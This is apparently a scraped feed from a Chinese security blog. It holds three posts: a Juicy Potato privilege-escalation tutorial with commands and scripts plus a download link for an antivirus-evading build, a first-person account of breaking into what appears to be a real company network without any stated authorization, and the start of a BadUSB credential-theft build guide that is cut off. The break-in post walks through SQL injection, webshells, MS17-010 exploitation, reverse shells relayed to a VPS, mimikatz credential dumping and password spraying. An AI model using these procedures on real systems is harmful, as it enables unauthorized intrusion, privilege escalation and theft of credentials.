class="headerlink" title="0x02-Juicy-Potato局限性"></a>0x02-Juicy-Potato局限性</h3><p>①当前用户必须具有以下权限中的一种，或者两种同时具备</p><p>SeImpersonate权限</p><p>SeAssignPrimaryToken权限</p><p>以下用户具有该权限：</p><p><strong>·</strong> 本地管理员组成员和本地服务帐户</p><p><strong>·</strong> 由服务控制管理器启动的服务</p><p><strong>·</strong> COM基础结构启动的并配置为在特定帐户下运行的COM服务器</p><h5 id="针对提权的话，主要是第三类用户"><a href="#针对提权的话，主要是第三类用户" class="headerlink" title="针对提权的话，主要是第三类用户"></a>针对提权的话，主要是第三类用户</h5><p>常见的为LocalService用户，例如IIS和者sqlserver的用户</p><p>②开启DCOM,并能找到可用的COM对象</p><p>③开启RPC</p><h3 id="0x03-原理-来自3g大佬"><a href="#0x03-原理-来自3g大佬" class="headerlink" title="0x03-原理(来自3g大佬)"></a>0x03-原理(来自3g大佬)</h3><p><strong>·</strong> LocalService用户默认具有SeImpersonate和SeAssignPrimaryToken权限</p><p><strong>·</strong> 开启SeImpersonate权限后，能够在调用CreateProcessWithToken时，传入新的Token创建新的进程</p><p><strong>·</strong> 开启SeAssignPrimaryToken权限后，能够在调用CreateProcessAsUser时，传入新的Token创建新的进程</p><p>Juicy Potato的实现流程如下：</p><p><strong>1、加载COM，发出请求，权限为System</strong></p><p>在指定ip和端口的位置尝试加载一个COM对象。</p><p>RottenPotatoNG使用的COM对象为BITS，CLSID为{4991d34b-80a1-4291-83b6-3328366b9097}</p><p>可供选择的COM对象不唯一，Juicy Potato提供了多个，详细列表可参考如下地址：</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p><strong>2、回应步骤1的请求，发起NTLM认证</strong></p><p>正常情况下，由于权限不足，当前权限不是System，无法认证成功。</p><p><strong>3、针对本地端口，同样发起NTLM认证，权限为当前用户</strong></p><p>由于权限为当前用户，所以NTLM认证能够成功完成。</p><p>RottenPotatoNG使用的135端口。</p><p>Juicy Potato支持指定任意本地端口，但是RPC一般默认为135端口，很少被修改。</p><p><strong>4、分别拦截两个NTLM认证的数据包，替换数据，通过NTLM重放使得步骤1(权限为System)的NTLM认证通过，获得System权限的Token</strong></p><p>重放时需要注意NTLM认证的NTLM Server Challenge不同，需要修正。</p><p><strong>5、利用System权限的Token创建新进程</strong></p><p>如果开启SeImpersonate权限，调用CreateProcessWithToken，传入System权限的Token，创建的进程为System权限。</p><p>如果开启SeAssignPrimaryToken权限，调用CreateProcessAsUser，传入System权限的Token，创建的进程为System权限</p><h3 id="0x04-在命令行中使用"><a href="#0x04-在命令行中使用" class="headerlink" title="0x04-在命令行中使用"></a><strong>0x04-在命令行中使用</strong></h3><pre><code>D:\&gt;JuicyPotato.exeJuicyPotato v0.1Mandatory args:-t createprocess调用: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both-p &lt;program&gt;: 运行指定程序-l &lt;port&gt;: COM服务器侦听端口Optional args:-m &lt;ip&gt;: COM服务器侦听地址 (默认 127.0.0.1)-a &lt;argument&gt;: 传递给程序命令行参数 (默认 NULL)-k &lt;ip&gt;: RPC服务器IP地址 (默认 127.0.0.1)-n &lt;port&gt;: RPC服务器侦听端口 (默认 135)-c &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)-z 仅测试CLSID并打印令牌的用户</code></pre><p><strong>1、查看当前用户权限，是否符合要求</strong></p><p>whoami &#x2F;priv</p><p>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</p><p>如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</p><p>如果均开启，可以选择-t *</p><p>如果均未开启，那么无法提权。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607994.png" alt="image"></p><p><strong>2、查看RPC默认端口是否为135</strong></p><p>如果被修改(例如为111)，juicypotato的参数可以使用-n 111指定RPC端口</p><p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：</p><p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用-k <ip></p><p>Windows默认配置下，允许135端口的入站规则即可进行远程RPC登录。</p><p>添加防火墙规则允许135端口入站的命令如下：</p><p>netsh advfirewall firewall add rule name&#x3D;”135” protocol&#x3D;TCP dir&#x3D;in localport&#x3D;135 action&#x3D;allow</p><p><strong>3、选择可用的CLSID</strong></p><p>参考列表</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>根据你的系统类型选择CLSID（EG:{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}）</p><p>然后-c指定即可 </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607177.png" alt="image"></p><p>相关系统使用的CLSID文末都给大家打包了</p><p><strong>4、选择一个系统未占用的端口作为监听端口</strong></p><p>-l参数指定即可</p><p>例如，最终参数如下：</p><p>JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}）</p><p>即使用SeImpersonate权限创建进程，监听端口1111，使用的CLSID为{8BC3F05E-D86B-11D0-A075-00C04FB68820}来进行提权</p><h5 id="5-执行效果"><a href="#5-执行效果" class="headerlink" title="5.执行效果"></a>5.执行效果</h5><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607830.png" alt="image"></p><h3 id="0x05-在Webshell中使用JuicyPotato"><a href="#0x05-在Webshell中使用JuicyPotato" class="headerlink" title="0x05-在Webshell中使用JuicyPotato"></a>0x05-在Webshell中使用JuicyPotato</h3><p>webshell中使用Juicy-Potato的提权的话</p><p>Juicy potato需要进行一些特殊处理，使其直接返回结果</p><p>实现起来比较简单，在我文章后附有文件JuicyPotato-webshell.exe</p><p>其默认使用的CLSID为{4991d34b-80a1-4291-83b6-3328366b9097}</p><p>直接执行JuicyPotato-webshell.exe -p “whoami”</p><p>或者JuicyPotato-webshell.exe -p “whoami” -c {XXXXX}即可</p><p>执行效果如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607572.png" alt="image"></p><h3 id="0x06-在命令行中批量提取当前系统的CLSID"><a href="#0x06-在命令行中批量提取当前系统的CLSID" class="headerlink" title="0x06-在命令行中批量提取当前系统的CLSID"></a>0x06-在命令行中批量提取当前系统的CLSID</h3><p>官方给出的code如下</p><pre><code class="powershell">&lt;#This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTIONThen exports to CSV#&gt;$ErrorActionPreference = &quot;Stop&quot;# Importing some requirements. .\utils\Join-Object.ps1New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@&#123;N=&#39;CLSID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.appid -ne $null&#125;$APPID = Get-ItemProperty HKCR:\appid\* | select-object localservice,@&#123;N=&#39;AppID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.LocalService -ne $null&#125;$RESULT = Join-Object -Left $APPID -Right $CLSID -LeftJoinProperty AppID -RightJoinProperty AppID -Type AllInRight  | Sort-Object LocalService# Preparing to Output$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace &quot;Microsoft &quot;, &quot;&quot;$TARGET = $OS -Replace &quot; &quot;,&quot;_&quot;# Make target folderNew-Item -ItemType Directory -Force -Path .\$TARGET# Output in a CSV$RESULT | Export-Csv -Path &quot;.\$TARGET\CLSIDs.csv&quot; -Encoding ascii -NoTypeInformation# Export CLSIDs list$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath &quot;.\$TARGET\CLSID.list&quot; -Encoding ascii# Visual Table$RESULT | ogv</code></pre><p>部分系统中是无法正常提取的，会报错</p><p>在此贴上笔者修复的powershell提取脚本</p><pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@&#123;N=&#39;CLSID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.appid -ne $null&#125;foreach($a in $CLSID)&#123;        Write-Host $a.CLSID&#125;</code></pre><p>直接执行Powershell -ep bypass -f get-clid-2012.ps1即可</p><p>效果如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607804.png" alt="image"></p><h3 id="0x07-在目标机批量验证CLSID提权可用性"><a href="#0x07-在目标机批量验证CLSID提权可用性" class="headerlink" title="0x07-在目标机批量验证CLSID提权可用性"></a>0x07-在目标机批量验证CLSID提权可用性</h3><p>官方给出的批处理脚本经过测试后，问题非常多，本人做了一下修改</p><p>code如下–juicypotato.bat</p><pre><code class="shell">[url=home.php?mod=space&amp;uid=46675]@echo[/url] off:: Starting port, you can change itset /a port=10000SETLOCAL ENABLEDELAYEDEXPANSIONFOR /F %%i IN (CLSID.list) DO (   echo %%i !port!   juicypotato-webshell.exe -c %%i -p &quot;whoami&quot; &gt;&gt; result.log   set RET=!ERRORLEVEL!   :: echo !RET!   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1)</code></pre><p>执行后在同目录下生成一个result.log文件</p><p>记录测试不同CLSID使用烂土豆提权的结果</p><p>效果如图所示</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607196.png" alt="image"></p><p>随后根据log的相关输出，选择合适的CLSID进行权限提升即可</p><h3 id="0x08-在Cobaltstrike中使用Juicypotato提权"><a href="#0x08-在Cobaltstrike中使用Juicypotato提权" class="headerlink" title="0x08-在Cobaltstrike中使用Juicypotato提权"></a>0x08-在Cobaltstrike中使用Juicypotato提权</h3><p>在Cobaltstrike中使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升</p><p>但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><p>下载并解压reflectiveJuicyPotato.zip，在Cobaltstike中选择脚本管理器–&gt;load加载juicypotato.cna脚本</p><p>随后我们在提权模块即可发现多了一个JuicyPotato</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607449.png" alt="image"></p><p>点击开始后，提权效果如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607632.png" alt="image"></p><p>权限提升至NT AUTHORITY\SYSTEM</p><h3 id="0X09福利-x2F-实验资源下载"><a href="#0X09福利-x2F-实验资源下载" class="headerlink" title="0X09福利&#x2F;实验资源下载"></a>0X09福利&#x2F;实验资源下载</h3><p>本次实验环境中的原版JuicyPotato，JuicyPotato-webshell，Get-CLSID.ps1,批处理文件，Cobaltstrike脚本都已经给大家集成好了</p><p>听说JuicyPotato已经加入豪华全家桶系列？没事，咱有免杀版本</p><p>懂C的兄弟也可以自己修改一下源代码，很好过杀软的</p><p>链接：<a href="https://pan.baidu.com/s/1ZVctJIZnV8yWNWqW1Byqaw">https://pan.baidu.com/s/1ZVctJIZnV8yWNWqW1Byqaw</a> </p><p>提取码：m78s</p><h3 id="0X10-Reference"><a href="#0X10-Reference" class="headerlink" title="0X10 Reference"></a>0X10 Reference</h3><p><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/">https://github.com/ohpe/juicy-potato/tree/master/CLSID/</a></p><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p><a href="https://3gstudent.github.io/">https://3gstudent.github.io</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅记一次水逼的内网渗透</title>
      <link href="/2019/08/08/%E6%B5%85%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B0%B4%E9%80%BC%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2019/08/08/%E6%B5%85%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B0%B4%E9%80%BC%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-外网入口点"><a href="#0x00-外网入口点" class="headerlink" title="0x00 外网入口点"></a>0x00 外网入口点</h2><p>打开站点（这里用baidu.com替代）看了看，左翻翻右翻翻能看到很明显的“注入”点。简单测试一下（and 1&#x3D;1、1&#x3D;2），返回不一样，所以sqlmap一把梭。<br>Thread 10开十个线程，跑的能快点</p><pre><code>sqlmap -u https://baidu.com/detail.asp?Prod=2222222222 --random-agent  --thread 10</code></pre><p><a href="https://imgchr.com/i/e7t7Px"><img src="https://s2.ax1x.com/2019/08/08/e7t7Px.png" alt="e7t7Px.png"></a></p><p>估计外国站和带宽的原因，跑的很慢。所以走了一遍正常的信息收集:</p><pre><code>真实ip:8.8.8.8Web容器:Microsoft-IIS/7.5子域名：mailserver.baidu.commail.baidu.com端口：80、443......</code></pre><p>发现页面登录处admin有个万能密码，登录进去发现只有查看账单的一些功能，所以没用。<br>C段发现用同一套模板的站，判断是属同一家，所以也注入点跑了一遍。发现这个站跑的比目标站快很多，所以先搞。<br><a href="https://imgchr.com/i/e7tqxO"><img src="https://s2.ax1x.com/2019/08/08/e7tqxO.png" alt="e7tqxO.png"></a></p><p>–is-dba为dba权限，故os–shell试试，权限system<br><a href="https://imgchr.com/i/e7tbRK"><img src="https://s2.ax1x.com/2019/08/08/e7tbRK.png" alt="e7tbRK.png"></a></p><p>两个站都是08系统+sql注入+dba权限+system权限，直接拿到权限一条龙。外网入口点太轻松，可忽略，抱着学内网的心态。都一样的站，所以搞目标站。</p><h2 id="0x01-中转捣鼓"><a href="#0x01-中转捣鼓" class="headerlink" title="0x01 中转捣鼓"></a>0x01 中转捣鼓</h2><p>执行回显得很慢，加了threads 10也是很慢。想着上cs和msf，死活不上线，怀疑有杀软或者拦截协议或者其他。<br>ceye试一下 ping xxxxxxx.ceye.io<br><a href="https://imgchr.com/i/e7toI1"><img src="https://s2.ax1x.com/2019/08/08/e7toI1.png" alt="e7toI1.png"></a></p><p>平台有记录，能通外网。但是bitsadmin等下载命令都试了，不上线。走echo写马路线。<br>先找到web的目录，目录在C盘根目录？<br><a href="https://imgchr.com/i/e7tHG6"><img src="https://s2.ax1x.com/2019/08/08/e7tHG6.png" alt="e7tHG6.png"></a><br>写了n次马子，愣是没上去，位置不对还是有查杀小马的玩意？嗯，位置不对（猜可能有其他盘，d盘bingo）和好像还有个杀马子的玩意（用了个大小写换下，^是转义字符）。<br><a href="https://imgchr.com/i/e7tOMD"><img src="https://s2.ax1x.com/2019/08/08/e7tOMD.png" alt="e7tOMD.png"></a><br><a href="https://imgchr.com/i/e7N9it"><img src="https://s2.ax1x.com/2019/08/08/e7N9it.png" alt="e7N9it.png"></a></p><h2 id="0x02-惊现杀软"><a href="#0x02-惊现杀软" class="headerlink" title="0x02 惊现杀软"></a>0x02 惊现杀软</h2><p>查看进程，之前发现有进程有ekrn.exe，egui.exe（eset的进程），不会免杀的我浪死在沙滩上。之前在刀上能执行命令的，这次回去补图居然执行不了命令了。sqlmap那个执行回显太慢，找张内网机子的图补一下（它内网机子都装了eset）。</p><p><a href="https://imgchr.com/i/e7tjqH"><img src="https://s2.ax1x.com/2019/08/08/e7tjqH.png" alt="e7tjqH.png"></a></p><p>翻翻文件（无脑子的翻，不确定哪些重要哪些不重要，感觉都重要），看看有什么数据库密码什么的。找到一些配置文件，发现数据库密码、邮服密码？。（在某个文件夹里面发现同行的脚本，应该没被日穿吧。）</p><p><a href="https://imgchr.com/i/e7tXse"><img src="https://s2.ax1x.com/2019/08/08/e7tXse.png" alt="e7tXse.png"></a><br><a href="https://imgchr.com/i/e7txZd"><img src="https://s2.ax1x.com/2019/08/08/e7txZd.png" alt="e7txZd.png"></a><br><a href="https://imgchr.com/i/e7Niz8"><img src="https://s2.ax1x.com/2019/08/08/e7Niz8.png" alt="e7Niz8.png"></a></p><p>先留着这些账号密码，存着之后可以考虑进入内网开始爆破操作。</p><h2 id="0x03-msf大杀四方"><a href="#0x03-msf大杀四方" class="headerlink" title="0x03 msf大杀四方"></a>0x03 msf大杀四方</h2><p>  直接用之前获取到的Sqlserver的sa账号密码，xp_cmdshell执行命令<br><a href="https://imgchr.com/i/e7NSII"><img src="https://s2.ax1x.com/2019/08/08/e7NSII.png" alt="e7NSII.png"></a></p><p>Msf监听接收到shell，然后开启内网转发进入内网。<br><a href="https://imgchr.com/i/e7Neds"><img src="https://s2.ax1x.com/2019/08/08/e7Neds.png" alt="e7Neds.png"></a><br>run autoroute –s 网段<br><a href="https://imgchr.com/i/e7NELQ"><img src="https://s2.ax1x.com/2019/08/08/e7NELQ.png" alt="e7NELQ.png"></a><br>MS17-010安排上，秒杀内网开始</p><pre><code>Use auxiliary/scanner/smb/smb_ms17_010Set rhosts 网段ipSet threads 线程run</code></pre><p><a href="https://imgchr.com/i/e7NCJP"><img src="https://s2.ax1x.com/2019/08/08/e7NCJP.png" alt="e7NCJP.png"></a></p><p>这很泰国ms17-010基本都没打补丁。<br><a href="https://imgchr.com/i/e7NkQS"><img src="https://s2.ax1x.com/2019/08/08/e7NkQS.png" alt="e7NkQS.png"></a></p><p>搜集了一下信息，发现199ip很可能是个域控，存在大量用户（199不出网，不通外网）。<br>因为杀软问题直接利用ms17-010反弹shell是无法成功的，这里我们使用ms17-010命令执行的exp。</p><pre><code>Use auxiliary/admin/smb/ms17_010_commandSet command 执行的命令Set rhosts  目标Run</code></pre><p><a href="https://imgchr.com/i/e7Nuiq"><img src="https://s2.ax1x.com/2019/08/08/e7Nuiq.png" alt="e7Nuiq.png"></a><br><a href="https://imgchr.com/i/e7Nmon"><img src="https://s2.ax1x.com/2019/08/08/e7Nmon.png" alt="e7Nmon.png"></a><br>Ok执行成功，添加用户和管理组<br>然后regeorg配和proxifier用之前的外网口子进入内网（regeorg通过web脚本文件将内网流量转发出来，具体可百度学习）</p><p><a href="https://imgchr.com/i/e7NAsg"><img src="https://s2.ax1x.com/2019/08/08/e7NAsg.png" alt="e7NAsg.png"></a><br><a href="https://imgchr.com/i/e7NZZj"><img src="https://s2.ax1x.com/2019/08/08/e7NZZj.png" alt="e7NZZj.png"></a></p><p>然后远程到199ip的桌面，下面让199ip主机反弹shell到msf。<br><a href="https://imgchr.com/i/e7NyeH"><img src="https://s2.ax1x.com/2019/08/08/e7NyeH.png" alt="e7NyeH.png"></a><br>我们已经拿到6的权限，可以使用微软自带的netsh转发进行中转shell。<br>我们这里设置的是将访问ip 10.1.1.6  8081端口的流量全部转发到外网vps 4478端口<br><a href="https://imgchr.com/i/e7NKJ0"><img src="https://s2.ax1x.com/2019/08/08/e7NKJ0.png" alt="e7NKJ0.png"></a><br><a href="https://imgchr.com/i/e7NrOe"><img src="https://s2.ax1x.com/2019/08/08/e7NrOe.png" alt="e7NrOe.png"></a></p><p>199这个IP直接反弹shell到6的8081端口。（6会通过netsh设置转发到公网VPS上）。<br><a href="https://imgchr.com/i/e7NQzT"><img src="https://s2.ax1x.com/2019/08/08/e7NQzT.png" alt="e7NQzT.png"></a><br><a href="https://imgchr.com/i/e7N1QU"><img src="https://s2.ax1x.com/2019/08/08/e7N1QU.png" alt="e7N1QU.png"></a><br>199这个主机也没什么东西读波密码溜。（读密码需要system权限我们使用ms17-010进行提权）</p><p>通过ms17提权成功，读密码。</p><p><a href="https://imgchr.com/i/e7N3yF"><img src="https://s2.ax1x.com/2019/08/08/e7N3yF.png" alt="e7N3yF.png"></a><br>Load mimikatz 加载mimikatz<br>Kerberos   读取明文<br><a href="https://imgchr.com/i/e7N8L4"><img src="https://s2.ax1x.com/2019/08/08/e7N8L4.png" alt="e7N8L4.png"></a></p><p>我们拿到了199的明文密码。（下面我们利用此密码进行撞C段主机）。</p><pre><code>Use auxiliary/scanner/smb/smb_loginSet rhosts IPSet smbuser 用户名Set smbpass 密码Set threads 线程Run</code></pre><p><a href="https://imgchr.com/i/e7NYw9"><img src="https://s2.ax1x.com/2019/08/08/e7NYw9.png" alt="e7NYw9.png"></a></p><p>撞出了大量主机<br><a href="https://imgchr.com/i/e7NtoR"><img src="https://s2.ax1x.com/2019/08/08/e7NtoR.png" alt="e7NtoR.png"></a><br>此时行总发来了电报说他腰疼，七夕节腰疼有点意思。<br>通过行总发来的文档，得知内网存在5个C段，每个段都存在域控？？</p><p>前边已经得知10ip主机存在ms17（通外网，直接添加管理员用户）。<br><a href="https://imgchr.com/i/e7N0SK"><img src="https://s2.ax1x.com/2019/08/08/e7N0SK.png" alt="e7N0SK.png"></a></p><p>然后在进行IPC进行连接。<br><a href="https://imgchr.com/i/e7NUF1"><img src="https://s2.ax1x.com/2019/08/08/e7NUF1.png" alt="e7NUF1.png"></a><br>然后把马copy到目标C盘。<br><a href="https://imgchr.com/i/e7NaJx"><img src="https://s2.ax1x.com/2019/08/08/e7NaJx.png" alt="e7NaJx.png"></a><br>使用ms17进行执行木马反弹shell。<br><a href="https://imgchr.com/i/e7NdW6"><img src="https://s2.ax1x.com/2019/08/08/e7NdW6.png" alt="e7NdW6.png"></a><br>读取密码进行远程桌面连接。<br><a href="https://imgchr.com/i/e7NDyD"><img src="https://s2.ax1x.com/2019/08/08/e7NDyD.png" alt="e7NDyD.png"></a><br>Run getgui –e 开启远程桌面。<br><a href="https://imgchr.com/i/e7NBQO"><img src="https://s2.ax1x.com/2019/08/08/e7NBQO.png" alt="e7NBQO.png"></a><br><a href="https://imgchr.com/i/e7NcTA"><img src="https://s2.ax1x.com/2019/08/08/e7NcTA.png" alt="e7NcTA.png"></a><br>域内没有一台主机卧槽？域不要钱一样的搭建。（我们把目标转向1 IP主机 貌似还挺多域内主机 1的域为ESOURCE）。<br><a href="https://imgchr.com/i/e7NRYt"><img src="https://s2.ax1x.com/2019/08/08/e7NRYt.png" alt="e7NRYt.png"></a><br>1 IP主机没有可利用系统漏洞，目标转向域内用户，碰碰运气看能不能读到域管理密码。（先攻击存在ms17的域内主机）<br><a href="https://imgchr.com/i/e7N2FI"><img src="https://s2.ax1x.com/2019/08/08/e7N2FI.png" alt="e7N2FI.png"></a><br><a href="https://imgchr.com/i/e7NTmQ"><img src="https://s2.ax1x.com/2019/08/08/e7NTmQ.png" alt="e7NTmQ.png"></a><br><a href="https://imgchr.com/i/e7N7wj"><img src="https://s2.ax1x.com/2019/08/08/e7N7wj.png" alt="e7N7wj.png"></a></p><p>基本套路ms17添加用户IPC上传文件ms17执行木马。（不要问我为啥不直接弹shell，因为杀软拦截，为啥拦截？我不知道！）</p><p>读了两台域内主机的密码，都没有读到域用户密码。（连个域普通用户都没有，拿到一个普通用户还能搞个黄金票据）。<br><a href="https://imgchr.com/i/e7NWfP"><img src="https://s2.ax1x.com/2019/08/08/e7NWfP.png" alt="e7NWfP.png"></a></p><p><a href="https://imgchr.com/i/e7NhSf"><img src="https://s2.ax1x.com/2019/08/08/e7NhSf.png" alt="e7NhSf.png"></a></p><p>最后目标锁定在79 IP上 hash碰撞发现：他的本地管理员密码和199 IP主机本地管理员密码相同。<br><a href="https://imgchr.com/i/e7N4l8"><img src="https://s2.ax1x.com/2019/08/08/e7N4l8.png" alt="e7N4l8.png"></a><br><a href="https://imgchr.com/i/e7N56S"><img src="https://s2.ax1x.com/2019/08/08/e7N56S.png" alt="e7N56S.png"></a><br>最后成功读到一枚域管理密码，deng登陆进去<br><a href="https://imgchr.com/i/e7NHTs"><img src="https://s2.ax1x.com/2019/08/08/e7NHTs.png" alt="e7NHTs.png"></a></p><p>这特码是域环境？这特码是工作组吧。。。<br><a href="https://imgchr.com/i/e7NOf0"><img src="https://s2.ax1x.com/2019/08/08/e7NOf0.png" alt="e7NOf0.png"></a></p><p>头疼死了，其他段的域控不想搞了，本次内网渗透就此结束。</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅记Badusb窃取凭据的详细制作过程</title>
      <link href="/2019/06/26/%E6%B5%85%E8%AE%B0Badusb%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B/"/>
      <url>/2019/06/26/%E6%B5%85%E8%AE%B0Badusb%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01-简介"></a>0x01-简介</h2><p>1.概述<br>在2014年美国黑帽大会上，安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。<br><a href="https://imgchr.com/i/eACtFU"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450785.png" alt="eACtFU.png"></a></p><p>2.Badusb内部结构<br><a href="https://imgchr.com/i/eAC0yR"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450609.png" alt="eAC0yR.png"></a><br>从这张图便可以了解到–Badusb和普通的U盘并没有什么两样，因此迷惑性极高，很容易攻击成功</p><p>3.Badusb Hid攻击原理<br>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。简而言之，今天要介绍的Badusb利用的是虚拟键盘来实现恶意代码的执行。</p><p>4.Badusb攻击优势<br>攻击者将恶意代码存放于Badusb的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件无法应对BadUSB的攻击。</p><p>5.Teensy<br>攻击者在定制攻击设备时，会向USB设备中置入一个攻击芯片，此攻击芯片是一个非常小而且功能完整的单片机开发系统，它的名字叫TEENSY。通过TEENSY你可以模拟出一个键盘和鼠标，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器与存储空间和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。<br><a href="https://imgchr.com/i/eACUW4"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450242.png" alt="eACUW4.png"></a></p><p>6.Arduino<br>Arduino是一款便捷灵活、方便上手的开源电子原型平台。其开发环境，主要包含两个主要的部分：硬件部分是可以用来做电路连接的Arduino电路板；另外一个则是Arduino IDE，你的计算机中的程序开发环境。你只要在IDE中编写程序代码，将程序上传到Arduino电路板后，程序便会告诉Arduino电路板要做些什么了。<br><a href="https://imgchr.com/i/eACdSJ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450221.png" alt="eACdSJ.png"></a></p><p>7.攻击流程<br>Bad-Usb插入后，会模拟键盘对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载恶意代码(通常为powershell脚本)并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</p><h2 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02-准备工作"></a>0x02-准备工作</h2><p>1.硬件<br>我在这边选择的是BS Micro pro micro leonardo Arduino 开发板，结构是一个USB主控加一块到两块的存储颗粒。从原理来看。USB主控就是一个带原生usb接口的单片机。<br>虽然它的体积小，但它拥有丰富接口，使其不仅有传统控制器的功能，还有在电脑上实现鼠标、键盘的功能，串口功能，并且无需驱动，能直接实现与电脑的通信。<br>    它与其他大多数的MCU控制板一个很大的区别是编程不需要额外使用编程器，直接用USB就可以编程。这样不仅方便、稳定、可靠，还省下了一个编程器的钱。 </p><p>淘宝链接:<br><a href="https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&id=589099911512&_u=m2i3k6cqf473">https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473</a></p><p>实际到货设备如图<br><a href="https://imgchr.com/i/eACBO1"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451688.png" alt="eACBO1.png"></a></p><p>2.开发环境安装<br>Arduino IDE<br><a href="https://imgchr.com/i/eACyTK"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451614.png" alt="eACyTK.png"></a><br>kali下已集成，windows下载链接：<br><a href="http://downloads.arduino.cc/arduino-1.6.4-windows.zip">http://downloads.arduino.cc/arduino-1.6.4-windows.zip</a><br>下载为zip文件，无需安装，直接解压就能用。<br>注意：不要下载高于1.6.4的版本，否则设备驱动无法正常安装！（我被这个坑乐好一段时间）</p><p>3.驱动准备<br>为了可以正常使用ardunio对开发版进行编程，需安装Teensyduino驱动<br>下载链接<a href="http://www.pjrc.com/teensy/td_123/teensyduino.exe">http://www.pjrc.com/teensy/td_123/teensyduino.exe</a><br><a href="https://imgchr.com/i/eACsw6"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451655.png" 